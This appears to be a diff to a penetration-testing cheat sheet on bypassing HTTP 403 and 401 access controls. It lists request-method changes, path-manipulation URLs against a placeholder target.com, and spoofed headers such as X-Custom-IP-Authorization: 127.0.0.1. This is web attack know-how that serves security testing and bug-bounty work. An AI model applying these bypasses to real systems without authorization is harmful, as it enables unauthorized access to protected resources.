@@ -1,3 +1,5 @@
+# 403 Forbidden Bypass
+
 ### Change request method.
 ```
 POST -> GET
@@ -49,3 +51,11 @@ target.com/./secret/./ -> ```200 Ok```
 target.com/secret/* -> ```200 Ok```
 
 target.com/. -> ```200 Ok```
+
+
+# 401 Unauthorized Bypass
+
+```
+X-Custom-IP-Authorization: 127.0.0.1
+X-Forwarded-Origin: 127.0.0.1
+```
